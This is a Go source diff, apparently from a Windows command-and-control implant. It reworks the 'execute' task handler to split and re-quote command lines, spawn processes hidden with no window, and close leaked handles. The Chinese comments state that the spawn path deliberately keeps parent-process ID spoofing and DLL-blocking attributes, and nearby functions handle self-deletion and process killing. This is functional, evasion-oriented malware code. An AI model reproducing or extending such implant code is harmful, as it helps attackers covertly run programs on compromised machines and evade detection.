@@ -357,27 +357,70 @@ func legacyDeleteSelf(filename string) ([]byte, error) {
 	}
 	return []byte("success delete (legacy)"), nil
 }
+// Execute 执行 `execute "<程序>" [参数...]`：无窗口后台启动，不等待退出。
+//
+// 原实现把整串（含引号与参数）当成程序路径交给 CreateProcess，
+// 带参数或路径含空格时必然启动失败。这里先按命令行拆分，再按 Windows 的
+// 引号/反斜杠规则重新拼成 lpCommandLine；仍然走 createProcessWithAttrs，
+// 保留 PPID 伪装与 BlockDLLs 等属性（源码棘轮测试也要求主 spawn 路径都走它）。
 func Execute(b []byte) ([]byte, error) {
+	parts := SplitCommandLine(string(b))
+	if len(parts) == 0 {
+		return nil, errors.New("execute: empty command")
+	}
+	commandLine := buildWindowsCommandLine(parts)
+	cmdLinePtr, err := syscall.UTF16PtrFromString(commandLine)
+	if err != nil {
+		return nil, errors.New("could not spawn " + commandLine + ": " + err.Error())
+	}
+
 	var sI windows.StartupInfo
 	var pI windows.ProcessInformation
-	var status = windows.CREATE_NO_WINDOW
 	sI.ShowWindow = windows.SW_HIDE
-
-	command := string(b)
-
-	program, _ := syscall.UTF16PtrFromString(command)
-
-	var err error
 
 	ca := newChildAttrs()
 	defer ca.Close()
 
-	err = createProcessWithAttrs(program, true, uint32(status), &sI, &pI, ca)
-	if err != nil {
-		return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
+	if err := createProcessWithAttrs(cmdLinePtr, true, uint32(windows.CREATE_NO_WINDOW), &sI, &pI, ca); err != nil {
+		return nil, errors.New("could not spawn " + commandLine + " " + err.Error())
 	}
+	// 句柄不再使用：关闭，避免每个任务泄漏两个句柄
+	windows.CloseHandle(pI.Thread)
+	windows.CloseHandle(pI.Process)
 
-	return []byte("success execute " + string(b)), nil
+	return []byte("success execute " + commandLine), nil
+}
+
+// buildWindowsCommandLine 按 MSVC 运行库规则拼 lpCommandLine：
+// 含空白或引号的参数加双引号，参数内的引号前补反斜杠。
+func buildWindowsCommandLine(parts []string) string {
+	var b strings.Builder
+	for i, p := range parts {
+		if i > 0 {
+			b.WriteByte(' ')
+		}
+		if p != "" && !strings.ContainsAny(p, " \t\n\v\"") {
+			b.WriteString(p)
+			continue
+		}
+		b.WriteByte('"')
+		backslashes := 0
+		for _, r := range p {
+			if r == '\\' {
+				backslashes++
+				b.WriteRune(r)
+				continue
+			}
+			if r == '"' {
+				b.WriteString(strings.Repeat(`\`, backslashes+1))
+			}
+			backslashes = 0
+			b.WriteRune(r)
+		}
+		b.WriteString(strings.Repeat(`\`, backslashes))
+		b.WriteByte('"')
+	}
+	return b.String()
 }
 func KillProcess(pid uint32) ([]byte, error) {
 	proc, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
